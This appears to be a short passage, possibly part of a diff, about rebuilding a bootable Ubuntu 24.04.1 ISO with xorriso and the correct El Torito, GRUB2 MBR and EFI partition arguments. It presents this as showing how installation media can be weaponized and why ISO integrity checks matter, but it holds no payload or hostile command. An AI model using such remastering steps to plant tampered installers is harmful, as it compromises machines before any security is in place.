+On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source, the `-append_partition 2` byte range and GUID, and the `-b '/boot/grub/i386-pc/eltorito.img'` boot image path. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.
+
+For more advanced automation, consider using live-build or livecd-rootfs, which are Canonical's official tools for building Ubuntu images.
